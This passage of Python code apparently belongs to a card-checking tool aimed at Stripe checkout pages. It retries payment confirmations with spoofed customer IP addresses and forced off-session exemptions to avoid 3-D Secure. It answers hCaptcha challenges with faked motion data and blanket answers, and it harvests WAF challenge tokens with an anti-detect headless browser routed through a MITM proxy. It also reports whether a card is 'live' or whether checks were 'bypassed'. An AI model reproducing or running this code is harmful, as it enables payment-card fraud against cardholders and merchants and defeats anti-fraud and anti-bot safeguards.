                _init_err_decline = confirm_json.get('error', {}).get('decline_code')
                _init_status = confirm_json.get('status')
                
                if _init_err_decline == 'authentication_required' or _init_err_code == 'authentication_required' or _init_status == 'requires_action':
                    _hitchk_attempts = [
                        # Attempt 1: Setup Future Usage & Request 3DS Automatic (Frictionless fallback)
                        {
                            "payment_method_options[card][request_three_d_secure]": "automatic",
                            "payment_method_options[card][setup_future_usage]": "off_session",
                        },
                        # Attempt 2: Mandate Data Customer Acceptance with spoofed IP & Setup Future Usage
                        {
                            "payment_method_options[card][setup_future_usage]": "off_session",
                            "mandate_data[customer_acceptance][type]": "online",
                            "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                            "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"],
                        },
                        # Attempt 3: Low-value TRA exemption + mandate
                        {
                            "payment_method_options[card][request_three_d_secure]": "automatic",
                            "payment_method_options[card][setup_future_usage]": "off_session",
                            "mandate_data[customer_acceptance][type]": "online",
                            "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                            "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"],
                        }
                    ]

                    # FIX 1+3: Route directly to /v1/payment_intents/{pi}/confirm once inner pi_ is known
                    # payment_pages endpoint rejects mandate_data with parameter_unknown — pi confirm accepts it
                    _hitchk_pi = None
                    _hitchk_cs = None
                    _hitchk_is_setup = False
                    _raw_pi = confirm_json.get('payment_intent')
                    _raw_si = confirm_json.get('setup_intent')
                    if isinstance(_raw_pi, dict) and _raw_pi.get('id'):
                        _hitchk_pi = _raw_pi['id']
                        _hitchk_cs = _raw_pi.get('client_secret')
                        _hitchk_is_setup = False
                    elif isinstance(_raw_si, dict) and _raw_si.get('id'):
                        _hitchk_pi = _raw_si['id']
                        _hitchk_cs = _raw_si.get('client_secret')
                        _hitchk_is_setup = True
                    elif isinstance(_raw_pi, str) and _raw_pi.startswith('pi_') and client_secret:
                        _hitchk_pi = _raw_pi
                        _hitchk_cs = client_secret

                    _hitchk_ep = "setup_intents" if _hitchk_is_setup else "payment_intents"
                    _hitchk_confirm_url = (
                        f"https://api.stripe.com/v1/{_hitchk_ep}/{_hitchk_pi}/confirm"
                        if _hitchk_pi and _hitchk_cs
                        else confirm_url
                    )

                    for _attempt in _hitchk_attempts:
                        _att_data = confirm_data.copy()
                        for _k in list(_att_data.keys()):
                            if _k.startswith('payment_method_options') or _k.startswith('mandate_data'):
                                del _att_data[_k]
                        _att_data.update(_attempt)

                        # Strip mandate_data if still hitting payment_pages endpoint — returns parameter_unknown
                        if _hitchk_confirm_url == confirm_url and not is_pi and not is_seti:
                            _att_data = {k: v for k, v in _att_data.items() if not k.startswith('mandate_data')}

                        # Inject pi-confirm-specific fields if routing to direct intent endpoint
                        if _hitchk_pi and _hitchk_cs and _hitchk_confirm_url != confirm_url:
                            _att_data["client_secret"] = _hitchk_cs
                            _att_data["use_stripe_sdk"] = "false"
                            _att_data["return_url"] = checkout_page_url
                            for _rm in ["init_checksum", "consent[terms_of_service]",
                                        "client_attribution_metadata[client_session_id]",
                                        "client_attribution_metadata[merchant_integration_source]",
                                        "client_attribution_metadata[merchant_integration_version]",
                                        "client_attribution_metadata[payment_method_selection_flow]",
                                        "client_attribution_metadata[checkout_config_id]",
                                        "expected_amount"]:
                                _att_data.pop(_rm, None)

                        confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                        confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(_hitchk_confirm_url, headers=confirm_headers, data=_att_data, timeout=30))
                        confirm_json = confirm_res.json()
                        confirm_data = _att_data

                        err_code = confirm_json.get('error', {}).get('code')
                        err_decline = confirm_json.get('error', {}).get('decline_code')
                        err_msg = confirm_json.get('error', {}).get('message', '') or ''

                        status = confirm_json.get('status')
                        if status in ['succeeded', 'requires_capture', 'processing'] or (err_decline and err_decline != 'authentication_required' and err_code != 'authentication_required'):
                            break

                # Lock Timeout Bypass — Stripe returns this when concurrent requests hit the same PI
                # Retry with exponential back-off up to 3 times
                err_code = confirm_json.get('error', {}).get('code')
                err_msg = confirm_json.get('error', {}).get('message', '') or ''
                _lock_retries = 0
                while _lock_retries < 3 and (err_code == 'lock_timeout' or 'another API request' in err_msg or 'currently accessing it' in err_msg):
                    _lock_retries += 1
                    await asyncio.sleep(1.5 * _lock_retries + random.uniform(0.2, 0.8))
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                    confirm_json = confirm_res.json()
                    err_code = confirm_json.get('error', {}).get('code')
                    err_msg = confirm_json.get('error', {}).get('message', '') or ''
                
                # Unified Amount Mismatch Bypass
                # Check response.status_code != 200 OR check if error payload returned in response json dict
                has_amount_mismatch = False
                _err_lower = err_msg.lower()
                if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in _err_lower or 'expected_amount' in err_msg or 'has to be provided' in _err_lower):
                    has_amount_mismatch = True
                elif confirm_res.status_code == 200:
                    temp_err = confirm_json.get('error', {})
                    if temp_err:
                        temp_code = temp_err.get('code')
                        temp_msg = temp_err.get('message', '') or ''
                        if temp_code == 'checkout_amount_mismatch' or 'expected amount' in temp_msg.lower() or 'computed invoice' in temp_msg.lower() or 'expected_amount' in temp_msg or 'has to be provided' in temp_msg.lower():
                            has_amount_mismatch = True
                            err_code = temp_code
                            err_msg = temp_msg

                if has_amount_mismatch:
                    # Stripe's error message usually contains the correct expected amount: 
                    # e.g., "The expected amount (2000) does not match the actual amount (0)."
                    import re
                    match = re.search(r'actual amount \((\d+)\)', err_msg.lower())
                    if not match:
                        # Also try: "The expected amount of the confirmation has to be provided."
                        # In this case use scraped raw_amount, or try 0
                        match = re.search(r'expected amount \((\d+)\)', err_msg.lower())
                    if match:
                        confirm_data['expected_amount'] = int(match.group(1))
                    elif self.raw_amount is not None and self.raw_amount > 0:
                        # Use the scraped amount from payment data init
                        confirm_data['expected_amount'] = self.raw_amount
                    elif 'subscription' in err_msg.lower() or 'computed invoice' in err_msg.lower() or 'latest invoice' in err_msg.lower():
                        # For subscription checkouts, delete expected_amount to let Stripe confirm the computed invoice automatically
                        if 'expected_amount' in confirm_data:
                            del confirm_data['expected_amount']
                    else:
                        # Fallback to 0 for SetupIntents / Free Trials if regex fails
                        confirm_data['expected_amount'] = 0
                        
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                    confirm_json = confirm_res.json()
                    
                    if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch':
                        if 'payment_method' in confirm_data:
                            del confirm_data['payment_method']
                            
                        for k, v in pm_data.items():
                            if '[' in k:
                                new_k = "payment_method_data[" + k.replace("[", "][", 1)
                            else:
                                new_k = f"payment_method_data[{k}]"
                            confirm_data[new_k] = v
                            
                        # Ensure no invalid keys leaked in
                        if "payment_method_data[key]" in confirm_data:
                            del confirm_data["payment_method_data[key]"]
                            
                        confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                        confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                        confirm_json = confirm_res.json()
                        
                        if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch':
                            # Now that PM Data (with address) is attached, Stripe calculated exact tax.
                            # We can hit /init to scrape the finalized invoice total and do one last retry.
                            try:
                                init_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/init"
                                init_headers = confirm_headers.copy()
                                if "Idempotency-Key" in init_headers:
                                    del init_headers["Idempotency-Key"]
                                init_data = f"key={self.pk_live}&eid=NA&browser_locale=en-US"
                                init_res = await loop.run_in_executor(None, lambda: _cffi_session.post(init_url, headers=init_headers, data=init_data, timeout=10))
                                init_res_json = init_res.json()
                                new_amount = init_res_json.get('total_summary', {}).get('total')
                                if not new_amount:
                                    new_amount = init_res_json.get('invoice', {}).get('amount_due')
                                if not new_amount:
                                    new_amount = init_res_json.get('invoice', {}).get('total')
                                if new_amount:
                                    confirm_data["expected_amount"] = new_amount
                                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                                    confirm_json = confirm_res.json()
                            except Exception:
                                pass
                
                result['response_time'] = time.time() - start
                
                if confirm_res.status_code == 200 and 'error' not in confirm_json:
                    pi = confirm_json.get('payment_intent', {})
                    si = confirm_json.get('setup_intent', {})
                    intent_id = pi.get('id') if isinstance(pi, dict) and pi.get('id') else (si.get('id') if isinstance(si, dict) else None)
                    client_secret = pi.get('client_secret') if isinstance(pi, dict) and pi.get('client_secret') else (si.get('client_secret') if isinstance(si, dict) else None)
                    if not intent_id or not client_secret:
                        fallback_id, fallback_secret = extract_intent_details(confirm_json)
                        intent_id = intent_id or fallback_id
                        client_secret = client_secret or fallback_secret
                    is_setup_intent = bool(si) or (isinstance(intent_id, str) and 'seti' in intent_id)
                    
                    if isinstance(pi, dict) and pi.get('last_payment_error'):
                        err = pi.get('last_payment_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        result['raw_response'] = confirm_json
                        return result
                        
                    if isinstance(si, dict) and si.get('last_setup_error'):
                        err = si.get('last_setup_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        result['raw_response'] = confirm_json
                        return result
    
                    status = confirm_json.get('status')
                    next_action = confirm_json.get('next_action', {})
                    if isinstance(pi, dict):
                        if pi.get('status'): status = pi.get('status')
                        if pi.get('next_action'): next_action = pi.get('next_action')
                    elif isinstance(si, dict):
                        if si.get('status'): status = si.get('status')
                        if si.get('next_action'): next_action = si.get('next_action')
                        
                    if status in ['succeeded', 'requires_capture', 'complete']:
                        result['success'] = True
                        result['raw_response'] = confirm_json
                        _curl = (
                            confirm_json.get('return_url')
                            or confirm_json.get('success_url')
                            or confirm_json.get('redirect_to_url', {}).get('url')
                            or (isinstance(pi, dict) and (pi.get('next_action', {}).get('redirect_to_url', {}).get('url')))
                            or find_receipt_url(confirm_json)
                        )
                        if _curl:
                            result['confirm_url'] = _curl
                        receipt_url = find_receipt_url(confirm_json)
                        if not receipt_url and intent_id and client_secret:
                            receipt_url = await self.fetch_receipt_url(intent_id, client_secret, headers, proxies, profile)
                        if receipt_url:
                            result['receipt_url'] = receipt_url
                        return result
                    elif status in ['requires_action', 'requires_source_action']:
                        try:
                            state = None
                            captcha_triggered = False
                            _hcaptcha_token = None
                            # Unwrap: confirm returns a checkout.session object. PI lives inside it.
                            # res must be the PI/SI dict — not the outer session (status='open')
                            res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
                            if not isinstance(res, dict):
                                res = confirm_json
                            # If outer object is a checkout.session, unwrap the inner PI
                            if res.get('object') in ('checkout.session', 'payment_pages.checkout_session'):
                                res = res.get('payment_intent') or res.get('setup_intent') or res
                                if not isinstance(res, dict):
                                    res = confirm_json
                            pk = self.pk_live
                            pi = intent_id
                            taken = time.time() - start
                            
                            session = requests.Session()
                            if proxies:
                                session.proxies = proxies

                            # Always enter action block — we're already in the requires_action branch
                            _res_status = res.get("status") or status
                            if _res_status in ["requires_action", "requires_source_action"] or status in ["requires_action", "requires_source_action"]:
                                next_action = res.get("next_action") or {}
                                sdk = next_action.get("use_stripe_sdk") or {}
                                captcha_triggered = False
                                _top_rqdata = None
                                _top_sitekey = None

                                # ── CAPTCHA DETECTION (3 locations) ─────────────────────────────────
                                # 1. Classic: rqdata inside next_action.use_stripe_sdk.stripe_js
                                stripe_js = sdk.get('stripe_js') or {}
                                if isinstance(stripe_js, dict) and 'rqdata' in stripe_js:
                                    captcha_triggered = True
                                    _top_rqdata = stripe_js.get('rqdata')
                                    _top_sitekey = stripe_js.get('captcha_site_key')
                                    rq_source = stripe_js.get('source') or stripe_js.get('three_d_secure_2_source')
                                    if rq_source:
                                        sdk['_rq_source_override'] = rq_source

                                # 2. Session-level: rqdata at top level of checkout.session confirm_json
                                #    Merchants like Flyps return rqdata here — completely missed by stripe_js check
                                if not captcha_triggered:
                                    _sess_rqdata = confirm_json.get('rqdata')
                                    if _sess_rqdata:
                                        captcha_triggered = True
                                        _top_rqdata = _sess_rqdata
                                        _top_sitekey = confirm_json.get('site_key') or confirm_json.get('hcaptcha_site_key')

                                # 3. Link settings: hcaptcha_rqdata in link_settings block
                                if not captcha_triggered:
                                    _ls = confirm_json.get('link_settings') or {}
                                    _ls_rqdata = _ls.get('hcaptcha_rqdata')
                                    if _ls_rqdata:
                                        captcha_triggered = True
                                        _top_rqdata = _ls_rqdata
                                        _top_sitekey = _ls.get('hcaptcha_site_key')
                                # ────────────────────────────────────────────────────────────────────

                                # ── WAF GATE DETECTION: intent_confirmation_challenge ────────────────
                                # This is NOT 3DS. Stripe's WAF returns use_stripe_sdk.type == 
                                # "intent_confirmation_challenge" with a verification_url that must be
                                # POSTed to before Stripe will allow the PI to be confirmed/charged.
                                # Without clearing this gate, we never reach the issuer.
                                _sdk_type = sdk.get('type') or ''
                                _is_waf_gate = (_sdk_type == 'intent_confirmation_challenge')
                                _verify_challenge_url = None
                                _waf_cleared = False
                                if _is_waf_gate and stripe_js:
                                    _raw_verify_path = stripe_js.get('verification_url') or ''
                                    if _raw_verify_path:
                                        _verify_challenge_url = (
                                            f"https://api.stripe.com{_raw_verify_path}"
                                            if _raw_verify_path.startswith('/') else _raw_verify_path
                                        )
                                    elif pi:
                                        # fallback: construct from pi_id
                                        _verify_challenge_url = f"https://api.stripe.com/v1/payment_intents/{pi}/verify_challenge"

                                if _is_waf_gate and _verify_challenge_url and pi and client_secret:
                                    try:
                                        # ── STEP 1: hCaptcha passive solve + WAF token harvest ────────────
                                        _trawl_captcha_token = None
                                        _trawl_cleared_cookies = []
                                        try:
                                            import requests as _trawl_req2
                                            import re as _re

                                            # ── PATH A: Passive hCaptcha via rqdata direct submission ──────────
                                            # Two distinct rqdata/sitekey pairs exist in the session:
                                            #   1. stripe_js.rqdata + stripe_js.site_key (c7faac4c) → WAF gate challenge
                                            #   2. link_settings.hcaptcha_rqdata + hcaptcha_site_key (24ed0064) → Link auth
                                            # We MUST use pair #1 for verify_challenge — pair #2 returns empty from getcaptcha.
                                            _waf_rqdata   = stripe_js.get('rqdata')
                                            _waf_sitekey  = stripe_js.get('site_key') or stripe_js.get('captcha_site_key') or 'c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a'
                                            # Fallback: session-level rqdata if stripe_js didn't have one
                                            _passive_rqdata  = _waf_rqdata or _top_rqdata or (confirm_json.get('link_settings') or {}).get('hcaptcha_rqdata')
                                            _passive_sitekey = _waf_sitekey if _waf_rqdata else (_top_sitekey or 'c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a')
                                            print(f"[DEBUG WAF PASSIVE] rqdata={bool(_passive_rqdata)} sitekey={_passive_sitekey} waf_rqdata={bool(_waf_rqdata)}")

                                            if _passive_rqdata and not _trawl_captcha_token:
                                                try:
                                                    _hc_host = checkout_page_url.split('#')[0].replace("https://", "").replace("http://", "").split("/")[0]
                                                    _hc_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                                                    _hc_headers = {
                                                        "User-Agent": _hc_ua,
                                                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                        "Origin": "https://newassets.hcaptcha.com",
                                                        "Referer": "https://newassets.hcaptcha.com/",
                                                        "Accept": "application/json",
                                                    }
                                                    # Step 1: GET checksiteconfig — get HSW challenge 'c' field
                                                    _gc_res = await loop.run_in_executor(None, lambda: _trawl_req2.get(
                                                        "https://hcaptcha.com/checksiteconfig",
                                                        params={"v": "e73e0d5", "host": _hc_host, "sitekey": _passive_sitekey, "sc": "1", "swa": "1", "spst": "1"},
                                                        headers=_hc_headers,
                                                        timeout=15
                                                    ))
                                                    _gc_j = _gc_res.json() if _gc_res and _gc_res.status_code == 200 else {}
                                                    _hsw_req = (_gc_j.get("c") or {}).get("req") if isinstance(_gc_j.get("c"), dict) else ""
                                                    print(f"[DEBUG WAF PASSIVE] checksiteconfig pass={_gc_j.get('pass')} hsw_req={bool(_hsw_req)}")

                                                    # Step 2: POST to /getcaptcha with rqdata to fetch passive task
                                                    _get_cap_data = {
                                                        "v": "e73e0d5",
                                                        "sitekey": _passive_sitekey,
                                                        "host": _hc_host,
                                                        "hl": "en",
                                                        "motionData": '{"st":1000,"dct":1000,"mm":[],"md":[],"mu":[],"v":1,"topLevel":{"st":1000,"sc":{"availWidth":1920,"availHeight":1040,"width":1920,"height":1080,"colorDepth":24,"pixelDepth":24,"availLeft":0,"availTop":40},"nv":{"cookieEnabled":true,"appCodeName":"Mozilla","appName":"Netscape","platform":"Win32","product":"Gecko","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},"dr":"","inv":false,"exec":false},"session":[],"widgetList":["0"],"widgetId":"0","ir":""}',
                                                        "pdc": '{"s":1000,"n":1}',
                                                        "n": _hsw_req or "",
                                                        "c": ('{"type":"hsw","req":"' + _hsw_req + '"}') if _hsw_req else "null",
                                                        "rqdata": _passive_rqdata,
                                                    }
                                                    _gcap_res = await loop.run_in_executor(None, lambda: _trawl_req2.post(
                                                        f"https://hcaptcha.com/getcaptcha/v1/{_passive_sitekey}",
                                                        data=_get_cap_data,
                                                        headers=_hc_headers,
                                                        timeout=20
                                                    ))
                                                    _gcap_j = _gcap_res.json() if _gcap_res and _gcap_res.status_code == 200 else {}
                                                    _pass_token = _gcap_j.get("generated_pass_UUID") or _gcap_j.get("pass_uuid") or ""
                                                    print(f"[DEBUG WAF PASSIVE] getcaptcha → pass_uuid={bool(_pass_token)} keys={list(_gcap_j.keys())}")

                                                    if _pass_token:
                                                        _trawl_captcha_token = _pass_token
                                                    else:
                                                        # Step 3: tasks returned — submit empty answers to checkcaptcha
                                                        _job_key = _gcap_j.get("key") or ""
                                                        _tasks = _gcap_j.get("tasklist") or []
                                                        if _job_key:
                                                            _answers_dict = {t.get("task_key", str(i)): "true" for i, t in enumerate(_tasks)} if _tasks else {"0": "true"}
                                                            import json as _json_mod
                                                            _check_data = {
                                                                "v": "e73e0d5",
                                                                "job_mode": _gcap_j.get("request_type", "token"),
                                                                "answers": _json_mod.dumps(_answers_dict),
                                                                "serverdomain": _hc_host,
                                                                "sitekey": _passive_sitekey,
                                                                "motionData": '{"st":2500,"dct":2500,"mm":[[100,200,1500]],"md":[],"mu":[]}',
                                                                "n": _hsw_req or "",
                                                                "c": ('{"type":"hsw","req":"' + _hsw_req + '"}') if _hsw_req else "null",
                                                                "key": _job_key,
                                                            }
                                                            _check_res = await loop.run_in_executor(None, lambda: _trawl_req2.post(
                                                                f"https://hcaptcha.com/checkcaptcha/v1/{_passive_sitekey}",
                                                                data=_check_data,
                                                                headers=_hc_headers,
                                                                timeout=20
                                                            ))
                                                            _check_j = _check_res.json() if _check_res and _check_res.status_code == 200 else {}
                                                            _pass_token = _check_j.get("generated_pass_UUID") or _check_j.get("pass_uuid") or ""
                                                            print(f"[DEBUG WAF PASSIVE] checkcaptcha → pass_uuid={bool(_pass_token)}")
                                                            if _pass_token:
                                                                _trawl_captcha_token = _pass_token
                                                except Exception as _pe:
                                                    print(f"[DEBUG WAF PASSIVE] passive rqdata solve failed: {_pe}")

                                            # ── PATH B: Playwright WAF Token Harvester ───────────────────────
                                            # Launch Camoufox, fill the actual Stripe card form, submit it,
                                            # intercept the verify_challenge POST to steal the captcha_response
                                            # token that Camoufox's anti-detect fingerprint generates natively.
                                            if not _trawl_captcha_token:
                                                try:
                                                    _card_raw_for_solver = f"{card.get('card','')}|{card.get('month','01')}|{card.get('year','30')}|{card.get('cvv','111')}"
                                                    print(f"[DEBUG TRAWL WAF] Launching Playwright WAF solver on {checkout_page_url[:75]}...")
                                                    _pw_token, _pw_body = await loop.run_in_executor(
                                                        None,
                                                        lambda: __import__(
                                                            'waf_solver',
                                                            fromlist=['solve_stripe_waf_token_sync']
                                                        ).solve_stripe_waf_token_sync(
                                                            checkout_page_url,
                                                            _card_raw_for_solver,
                                                            timeout=85.0,
                                                            headless=True,
                                                        )
                                                    )
                                                    if _pw_token:
                                                        _trawl_captcha_token = _pw_token
                                                        print(f"[DEBUG TRAWL WAF] Playwright WAF solver token len={len(_pw_token)}")
                                                    else:
                                                        # Fallback: passive /scrape to at least collect cookies
                                                        try:
                                                            _trawl_payload = {
                                                                "url": checkout_page_url.split('#')[0],
                                                                "maxTimeout": 30000,
                                                                "wait": 5000,
                                                            }
                                                            _trawl_res = await loop.run_in_executor(None, lambda: _trawl_req2.post(
                                                                f"{trawl_api_url.rstrip('/')}/scrape",
                                                                json=_trawl_payload,
                                                                timeout=35
                                                            ))
                                                            if _trawl_res and _trawl_res.status_code == 200:
                                                                _trawl_cleared_cookies = _trawl_res.json().get("cookies") or []
                                                                for _tc in _trawl_cleared_cookies:
                                                                    _tc_n = _tc.get("name") if isinstance(_tc, dict) else ""
                                                                    _tc_v = _tc.get("value") if isinstance(_tc, dict) else ""
                                                                    if _tc_n and _tc_v:
                                                                        _cffi_session.cookies.set(_tc_n, _tc_v, domain=".stripe.com", path="/")
                                                            print(f"[DEBUG TRAWL WAF] token=False, fallback cookies={len(_trawl_cleared_cookies)}")
                                                        except Exception:
                                                            pass
                                                except Exception as _tre:
                                                    print(f"[DEBUG TRAWL WAF] Playwright WAF solver error: {_tre}")
                                        except Exception as _twe:
                                            print(f"[DEBUG TRAWL WAF] bypass failed: {_twe}")




                                        # ── STEP 2: POST verify_challenge ───────────────────────────────────
                                        # Use _trawl_captcha_token extracted natively by Trawl.
                                        _best_token = _trawl_captcha_token
                                        _verify_data = {
                                            "key": self.pk_live,
                                            "client_secret": client_secret,
                                        }
                                        if _best_token:

                                            _verify_data["captcha_response"] = _best_token
                                        _verify_headers = headers.copy()
                                        _verify_headers["Idempotency-Key"] = str(uuid.uuid4())

                                        # Route through Trawl MITM proxy if CA cert present
                                        _verify_proxies = proxies
                                        if _trawl_ca:
                                            _verify_proxies = {
                                                "http": trawl_proxy_url,
                                                "https": trawl_proxy_url,
                                            }
                                        _verify_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                            _verify_challenge_url, headers=_verify_headers, data=_verify_data,
                                            proxies=_verify_proxies,
                                            verify=_trawl_ca if _trawl_ca else True,
                                            timeout=25, impersonate=profile["impersonate"]))
                                        _verify_json = _verify_res.json() if _verify_res else {}
                                        _vpi = _verify_json.get('payment_intent') or _verify_json.get('setup_intent') or _verify_json
                                        _vstat = _vpi.get('status') if isinstance(_vpi, dict) else None
                                        print(f"[DEBUG WAF VERIFY] status={_vstat} token={bool(_best_token)} proxy_routed={bool(_trawl_ca)} url={_verify_challenge_url}")
                                        if _vstat in ['succeeded', 'requires_capture', 'complete']:
                                            result['success'] = True
                                            result['is_live'] = True
                                            result['captcha_bypassed'] = True
                                            _curl = _verify_json.get('return_url') or _verify_json.get('success_url') or find_receipt_url(_verify_json)
                                            if _curl:
                                                result['confirm_url'] = _curl
                                            receipt_url = find_receipt_url(_verify_json)
                                            if receipt_url:
                                                result['receipt_url'] = receipt_url
                                            return result
                                        elif _vstat in ['requires_action', 'requires_source_action']:
                                            _vnext = (isinstance(_vpi, dict) and _vpi.get('next_action')) or {}
                                            _vsdk = _vnext.get('use_stripe_sdk') or {}
                                            _vnext_type = _vsdk.get('type') or ''
                                            _new_source = (
                                                _vsdk.get('three_d_secure_2_source')
                                                or _vsdk.get('source')
                                                or _vnext.get('source')
                                            )
                                            # Gate is only cleared if Stripe issued REAL 3DS (source present)
                                            # or next_action type changed away from intent_confirmation_challenge
                                            _waf_cleared = (_vnext_type != 'intent_confirmation_challenge') or bool(_new_source)
                                            print(f"[DEBUG WAF VERIFY] cleared={_waf_cleared} new_sdk_type={_vnext_type} source={bool(_new_source)}")
                                            if _waf_cleared:
                                                result['captcha_bypassed'] = True
                                            if _waf_cleared and _new_source:
                                                sdk = _vsdk
                                                next_action = _vnext
                                                res = _vpi
                                                pi = _vpi.get('id') or pi
                                                client_secret = _vpi.get('client_secret') or client_secret
                                        elif _vstat == 'requires_payment_method':
                                            # Issuer soft declined after challenge cleared
                                            _verr = _vpi.get('last_payment_error') or {}
                                            result['decline_code'] = _verr.get('decline_code') or _verr.get('code') or 'declined_after_waf'
                                            result['error'] = _verr.get('message', 'Declined after WAF verification')
                                            result['is_live'] = True
                                            result['3ds_bypassed'] = False
                                            result['3ds_type'] = 'waf_gate'
                                            result['captcha_bypassed'] = bool(_best_token or _trawl_cleared_cookies)
                                            result['raw_response'] = _verify_json
                                            return result
                                    except Exception as _wex:
                                        print(f"[DEBUG WAF VERIFY] exception: {_wex}")
                                # ────────────────────────────────────────────────────────────────────

                                source = (
                                    sdk.get("three_d_secure_2_source")
                                    or sdk.get("source")
                                    or sdk.get("_rq_source_override")
                                    or next_action.get("source")
                                )


                                # Execute app (3).py secondary PI/SETI confirm with client_secret on all requires_action responses
                                if pi and client_secret:
                                    # Attempt captcha solve if we have rqdata
                                    _hcaptcha_token = None
                                    if _top_rqdata:
                                        try:
                                            from stripe_captcha_bypasser import StripeCaptchaBypasser as _SCB
                                            _hcaptcha_token = await asyncio.get_event_loop().run_in_executor(
                                                None, lambda: _SCB._solve_hcaptcha_sync(
                                                    _top_sitekey or "4c787647-7985-4804-b8e9-f431dd3031d7",
                                                    _top_rqdata,
                                                    proxy_data=self.proxy_data
                                                ) if hasattr(_SCB, '_solve_hcaptcha_sync') else None
                                            )
                                        except Exception:
                                            pass
                                    print(f"[DEBUG CAPTCHA] triggered=True rqdata={bool(_top_rqdata)} token={bool(_hcaptcha_token)}")
                                    try:
                                        # Once initial confirm mints a PaymentIntent, reconfirm MUST target /v1/payment_intents/{pi}/confirm with client_secret
                                        _is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
                                        _intent_ep = "setup_intents" if _is_setup else "payment_intents"
                                        _target_confirm_url = f"https://api.stripe.com/v1/{_intent_ep}/{pi}/confirm" if (pi and client_secret) else confirm_url

                                        fresh_pm_data = pm_data.copy()
                                        fresh_pm_headers = headers.copy()
                                        fresh_pm_headers["Idempotency-Key"] = str(uuid.uuid4())
                                        try:
                                            fresh_pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(
                                                pm_url, headers=fresh_pm_headers, data=fresh_pm_data, timeout=30))
                                            fresh_pm_json = fresh_pm_res.json()
                                            if fresh_pm_json.get('id'):
                                                pm_id = fresh_pm_json['id']
                                        except Exception:
                                            pass  # keep existing pm_id as fallback

                                        reconfirm_data = {
                                            "payment_method": pm_id,
                                            "expected_payment_method_type": "card",
                                            "payment_method_options[card][request_three_d_secure]": "automatic",
                                            "use_stripe_sdk": "false",
                                            "key": self.pk_live,
                                        }
                                        if client_secret:
                                            reconfirm_data["client_secret"] = client_secret
                                        if self.raw_amount is not None and self.raw_amount > 0:
                                            reconfirm_data["expected_amount"] = self.raw_amount
                                        import uuid as _uuid
                                        reconfirm_headers = headers.copy()
                                        reconfirm_headers["Idempotency-Key"] = str(_uuid.uuid4())
                                        if _hcaptcha_token:
                                            reconfirm_headers["hcaptcha-response"] = _hcaptcha_token
                                        await asyncio.sleep(1)
                                        
                                        _reconfirm_proxies = proxies
                                        if _trawl_ca:
                                            _reconfirm_proxies = {
                                                "http": trawl_proxy_url,
                                                "https": trawl_proxy_url,
                                            }
                                        reconfirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                            _target_confirm_url, headers=reconfirm_headers, data=reconfirm_data,
                                            proxies=_reconfirm_proxies,
                                            verify=_trawl_ca if _trawl_ca else True,
                                            timeout=30, impersonate=profile["impersonate"]))
                                        reconfirm_json = reconfirm_res.json()
                                        rc_pi = reconfirm_json.get('payment_intent') or reconfirm_json.get('setup_intent') or reconfirm_json
                                        rc_status = rc_pi.get('status') if isinstance(rc_pi, dict) else None
                                        if rc_status in ['succeeded', 'requires_capture', 'complete']:
                                            result['success'] = True
                                            receipt_url = find_receipt_url(reconfirm_json)
                                            if receipt_url:
                                                result['receipt_url'] = receipt_url
                                            return result
                                        elif rc_status in ['requires_action', 'requires_source_action']:
                                            rc_sdk = (rc_pi.get('next_action', {}) or {}).get('use_stripe_sdk', {}) or {}
                                            source = (
                                                rc_sdk.get("three_d_secure_2_source")
                                                or rc_sdk.get("source")
                                                or (rc_pi.get('next_action', {}) or {}).get("source")
                                            )
                                            # Update intent for downstream polling
                                            if isinstance(rc_pi, dict) and rc_pi.get('id'):
                                                pi = rc_pi.get('id')
                                                intent_id = pi
                                                client_secret = rc_pi.get('client_secret') or client_secret
                                                res = rc_pi
                                                next_action = rc_pi.get('next_action', {}) or {}
                                                sdk = next_action.get('use_stripe_sdk', {}) or {}
                                    except Exception:
                                        pass
                                state = None

                                is_legacy_3ds = (
                                    res.get("status") == "requires_source_action"
                                    or sdk.get("type") == "three_d_secure_redirect"
                                    or next_action.get("type") == "redirect_to_url"
                                    or bool(confirm_json.get("url"))
                                )
                                processed_auth = False

                                if source:
                                    # STAGE 1: 3DS2 EMV Exemption Matrix Sweep (01, 04, 05, 02, U/01, N/03)
                                    auth_headers = {
                                        "accept": "application/json",
